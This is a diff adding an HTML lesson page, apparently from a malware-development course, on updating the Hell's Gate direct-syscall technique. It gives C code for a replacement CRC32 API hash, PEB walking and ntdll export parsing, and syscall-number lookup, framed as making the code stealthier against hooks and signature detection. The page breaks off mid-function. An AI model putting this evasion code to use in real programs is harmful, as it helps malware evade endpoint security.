@@ -1,0 +1,815 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Updating Hell&#39;s Gate</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+        <div id="updating-hell-s-gate" class="scroll-mt-24 pt-6 sm:pt-8 pb-3 border-b border-[#212b54] mt-8 sm:mt-12 mb-4 sm:mb-6 flex items-center justify-between group">
+            <h2 class="text-xl sm:text-2xl font-bold text-white tracking-tight flex items-center gap-2.5 sm:gap-3">
+                <i data-lucide="sparkles" class="w-4 h-4 sm:w-5 sm:h-5 text-[var(--accent)] flex-shrink-0"></i>
+                <span>Updating Hell's Gate</span>
+            </h2>
+            <a href="#updating-hell-s-gate" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition" class="opacity-0 group-hover:opacity-100 text-[#cbd5e1] hover:text-[var(--accent)] text-xs flex items-center gap-1 font-mono transition p-1.5 rounded hover:bg-[var(--accent-soft)]" title="Copy link">
+                <i data-lucide="link" class="w-4 h-4"></i>
+            </a>
+        </div><h3 id="introduction" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Introduction</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <em>Syscalls - Hell&#x27;s Gate</em> module introduced the Hell&#x27;s Gate technique, which bypasses userland hooks by searching for the syscall number in the hook bytes to be used later as a directly called syscall. This module updates the original Hell&#x27;s Gate implementation that was demonstrated in that module.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The updates will make the implementation more custom and as a result, make it more stealthy and reduce signature-based detection. Additionally, the updated code will change the way the implementation retrieves a syscall&#x27;s SSN by using <a href="https://github.com/trickster0/TartarusGate" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">TartarusGate&#x27;s</a> approach.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">If you require a refresher on the original Hell&#x27;s Gate implementation, visit the <a href="https://github.com/am0nsec/HellsGate" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Hell&#x27;s Gate GitHub repository</a>.</p><h3 id="updating-the-string-hashing-algorithm" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating The String Hashing Algorithm</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The original Hell&#x27;s Gate implementation used the <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L92" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">DJB2</a> string hashing algorithm. Updating the string hashing algorithm does not affect the Hell&#x27;s Gate implementation, but modifying the string hashing algorithm will likely reduce the likelihood of signature detection. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">djb2</code> function is replaced with the following function.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">unsigned int crc32h(char* message) {
+    int i, crc;
+    unsigned int byte, c;
+    const unsigned int g0 = SEED, g1 = g0 &gt;&gt; 1,
+        g2 = g0 &gt;&gt; 2, g3 = g0 &gt;&gt; 3, g4 = g0 &gt;&gt; 4, g5 = g0 &gt;&gt; 5,
+        g6 = (g0 &gt;&gt; 6) ^ g0, g7 = ((g0 &gt;&gt; 6) ^ g0) &gt;&gt; 1;
+
+    i = 0;
+    crc = 0xFFFFFFFF;
+    while ((byte = message[i]) != 0) {    // Get next byte.
+        crc = crc ^ byte;
+        c = ((crc &lt;&lt; 31 &gt;&gt; 31) &amp; g7) ^ ((crc &lt;&lt; 30 &gt;&gt; 31) &amp; g6) ^
+            ((crc &lt;&lt; 29 &gt;&gt; 31) &amp; g5) ^ ((crc &lt;&lt; 28 &gt;&gt; 31) &amp; g4) ^
+            ((crc &lt;&lt; 27 &gt;&gt; 31) &amp; g3) ^ ((crc &lt;&lt; 26 &gt;&gt; 31) &amp; g2) ^
+            ((crc &lt;&lt; 25 &gt;&gt; 31) &amp; g1) ^ ((crc &lt;&lt; 24 &gt;&gt; 31) &amp; g0);
+        crc = ((unsigned)crc &gt;&gt; 8) ^ c;
+        i = i + 1;
+    }
+    return ~crc;
+}</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">crc32h</code> function is an implementation of the <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">Cyclic Redundancy Check</a> string hashing algorithm and will be used in this module. To promote code readability and maintainability, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">crc32h</code> function will be called through the following macro.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">#define HASH(API) crc32h((char*)API)</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Where the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">API</code> variable is the string to hash using <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">crc32h</code>.</p><h3 id="updating-getvxtableentry" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Updating GetVxTableEntry</span></h3><h3 id="creating-the-ntdll-config-structure" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Creating The NTDLL_CONFIG Structure</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Recall that <a href="https://github.com/am0nsec/HellsGate/blob/master/HellsGate/main.c#L120" target="_blank" class="text-[var(--accent2)] hover:text-[var(--accent)] font-semibold underline underline-offset-2 transition">GetVxTableEntry</a> is the function used to retrieve the address and SSN of a specified syscall using its hash. The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetVxTableEntry</code> function calculates the required RVAs to search for the specified hash and takes two additional parameters, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pModuleBase</code> and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pImageExportDirectory</code>, which are not related to its purpose. To improve efficiency, the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NTDLL_CONFIG</code> structure is created and shown below.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">typedef struct _NTDLL_CONFIG
+{
+    PDWORD      pdwArrayOfAddresses; // The VA of the array of addresses of ntdll&#x27;s exported functions
+    PDWORD      pdwArrayOfNames;     // The VA of the array of names of ntdll&#x27;s exported functions
+    PWORD       pwArrayOfOrdinals;   // The VA of the array of ordinals of ntdll&#x27;s exported functions
+    DWORD       dwNumberOfNames;     // The number of exported functions from ntdll.dll
+    ULONG_PTR   uModule;             // The base address of ntdll - requred to calculated future RVAs
+
+}NTDLL_CONFIG, *PNTDLL_CONFIG;
+
+// global variable
+NTDLL_CONFIG g_NtdllConf = { 0 };</code></pre>
+        </div><h3 id="creating-initntdllconfigstructure" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Creating InitNtdllConfigStructure</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Furthermore, a private function, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitNtdllConfigStructure</code>, is created and called by <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetVxTableEntry</code> in order to initialize the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_NtdllConf</code> global structure. This allows <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetVxTableEntry</code> to access values from inside NTDLL&#x27;s headers without requiring additional parameters or calculations each time. As a result, <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitNtdllConfigStructure</code> initializes the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_NtdllConf</code> structure for future usage.</p><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitNtdllConfigStructure</code> function fetches the NTDLL base address and performs PE parsing to retrieve the export directory structure. The function then calculates the necessary RVAs to fill the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_NtdllConf</code> structure with the required data. The function returns <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">TRUE</code> if it succeeds in performing these actions and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FALSE</code> if <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_NtdllConf</code> still contains uninitialized elements.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">C / C++</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-c">BOOL InitNtdllConfigStructure() {
+
+    // getting peb
+    PPEB pPeb = (PPEB)__readgsqword(0x60);
+    if (!pPeb || pPeb-&gt;OSMajorVersion != 0xA)
+        return FALSE;
+
+    // getting ntdll.dll module (skipping our local image element)
+    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb-&gt;LoaderData-&gt;InMemoryOrderModuleList.Flink-&gt;Flink - 0x10);
+
+    // getting ntdll&#x27;s base address
+    ULONG_PTR uModule = (ULONG_PTR)(pLdr-&gt;DllBase);
+    if (!uModule)
+        return FALSE;
+
+    // fetching the dos header of ntdll
+    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
+    if (pImgDosHdr-&gt;e_magic != IMAGE_DOS_SIGNATURE)
+        return FALSE;
+
+    // fetching the nt headers of ntdll
+    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr-&gt;e_lfanew);
+    if (pImgNtHdrs-&gt;Signature != IMAGE_NT_SIGNATURE)
+        return FALSE;
+
+    // fetching the export directory of ntdll
+    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    if (!pImgExpDir)
+        return FALSE;
+
+    // initalizing the &#x27;g_NtdllConf&#x27; structure&#x27;s element
+    g_NtdllConf.uModule             = uModule;
+    g_NtdllConf.dwNumberOfNames     = pImgExpDir-&gt;NumberOfNames;
+    g_NtdllConf.pdwArrayOfNames     = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfNames);
+    g_NtdllConf.pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir-&gt;AddressOfFunctions);
+    g_NtdllConf.pwArrayOfOrdinals   = (PWORD)(uModule  + pImgExpDir-&gt;AddressOfNameOrdinals);
+
+    // checking
+    if (!g_NtdllConf.uModule || !g_NtdllConf.dwNumberOfNames || !g_NtdllConf.pdwArrayOfNames || !g_NtdllConf.pdwArrayOfAddresses || !g_NtdllConf.pwArrayOfOrdinals)
+        return FALSE;
+    else
+        return TRUE;
+}</code></pre>
+        </div><h3 id="renaming-updating-getvxtableentry" class="text-base sm:text-lg font-bold text-white mt-6 sm:mt-8 mb-3 flex items-center gap-2 scroll-mt-24"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent)] flex-shrink-0"></i><span>Renaming & Updating GetVxTableEntry</span></h3><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base"><code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">GetVxTableEntry</code> is renamed to <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FetchNtSyscall</code> and will have two parameters: <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">dwSysHash</code>, the hash value of the specified syscall to fetch the SSN for and <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pNtSys</code>, a pointer to an <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NT_SYSCALL</code> structure which contains everything required to perform a direct syscall. This structure will be initialized by <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FetchNtSyscall</code>.</p>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">typedef struct _NT_SYSCALL
+{
+	DWORD dwSSn;                    // syscall number
+	DWORD dwSyscallHash;            // syscall hash value
+	PVOID pSyscallAddress;          // syscall address
+
+}NT_SYSCALL, *PNT_SYSCALL;</code></pre>
+        </div><p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">The <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FetchNtSyscall</code> function does the following:</p><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Checks if the global <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">g_NtdllConf</code> structure is initialized. If not, it calls <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">InitNtdllConfigStructure</code> to do so.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Checks if the user specified a hash value, if not it returns <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">FALSE</code>.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>Initiates a for-loop to search for the specified syscall using its hash.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>When the syscall is found, it saves its address into the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pNtSys</code> structure.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>It then initiates a while-loop that searches for the SSN of the syscall. The search logic is the same as the original implementation.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>If the SSN is found, it&#x27;s saved into the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">pNtSys</code> structure.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>The function then breaks out of both loops and performs a final check to ensure that all the members of the <code class="px-2 py-0.5 mx-0.5 rounded-md bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold shadow-sm break-all">NT_SYSCALL</code> structure are initialized.</span></div><div class="flex items-start gap-2.5 text-sm sm:text-base text-[#e2e8f0] my-2.5 sm:my-3 leading-relaxed"><i data-lucide="chevron-right" class="w-4 h-4 text-[var(--accent2)] flex-shrink-0 mt-1"></i><span>The result is returned upon this check.</span></div>
+        <div class="my-6 sm:my-8 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs transition-all duration-300 hover:border-[var(--accent)]">
+            <div class="flex flex-wrap items-center justify-between gap-2 px-3 sm:px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                <div class="flex items-center gap-2 sm:gap-3">
+                    <div class="flex gap-1.5 items-center">
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ff7ad9] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#ffcf6b] inline-block shadow-sm"></span>
+                        <span class="w-2.5 h-2.5 rounded-full bg-[#43d17a] inline-block shadow-sm"></span>
+                    </div>
+                    <div class="flex items-center gap-1.5 text-[#cbd5e1] font-semibold text-xs tracking-wider uppercase pl-2 border-l border-[#212b54]">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                        <span class="text-white">ASM / x64</span>
+                    </div>
+                </div>
+                <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-2.5 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition active:scale-95">
+                    <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                    <span>Copy</span>
+                </button>
+            </div>
+            <pre class="p-3.5 sm:p-5 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono text-[11px] sm:text-xs"><code class="language-nasm">BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {
+
+    // initialize ntdll config if not found
+    if (!g_NtdllConf.uModule) {
+        if (!InitNtdllConfigStructure())
+            return FALSE;
+    }
+
+    // if no hash value was specified
+    if (dwSysHash != NULL)
+        pNtSys-&gt;dwSyscallHash = dwSysHash;
+    else
+        return FALSE;
+
+    // searching for &#x27;dwSysHash&#x27; in the exported functions of ntdll
+    for (size_t i = 0; i &lt; g_NtdllConf.dwNumberOfNames; i++) {
+
+        PCHAR pcFuncName   = (PCHAR)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfNames[i]);
+        PVOID pFuncAddress = (PVOID)(g_NtdllConf.uModule + g_NtdllConf.pdwArrayOfAddresses[g_NtdllConf.pwArrayOfOrdinals[i]]);
+
+        // if syscall found
+        if (HASH(pcFuncName) == dwSysHash) {
+
+            // save the address
+            pNtSys-&gt;pSyscallAddress = pFuncAddress;
+
+            WORD cw = 0;
+
+            // search for the ssn
+            while (TRUE) {
+
+                // reached &#x27;ret&#x27; instruction - we are so far down
+                if (*((PBYTE)pFuncAddress + cw) == 0xC3 &amp;&amp; !pNtSys-&gt;dwSSn)
+                    return FALSE;
+
+                // reached &#x27;syscall&#x27; instruction - we are so far down
+                if (*((PBYTE)pFuncAddress + cw) == 0x0F &amp;&amp; *((PBYTE)pFuncAddress + cw + 1) == 0x05 &amp;&amp; !pNtSys-&gt;dwSSn)
+                    return FALSE;
+
+                if (*((PBYTE)pFuncAddress + cw) == 0x4C
+                    &amp;&amp; *((PBYTE)pFuncAddress + 1 + cw) == 0x8B
+                    &amp;&amp; *((PBYTE)pFuncAddress + 2 + cw) == 0xD1
+                    &amp;&amp; *((PBYTE)pFuncAddress + 3 + cw) == 0xB8
+                    &amp;&amp; *((PBYTE)pFuncAddress + 6 + cw) == 0x00
+                    &amp;&amp; *((PBYTE)pFuncAddress + 7 + cw) == 0x00) {
+
+                    BYTE high = *((PBYTE)pFuncAddress + 5 + cw);
+                    BYTE low = *((PBYTE)pFuncAddress + 4 + cw);
+                    // save the ssn
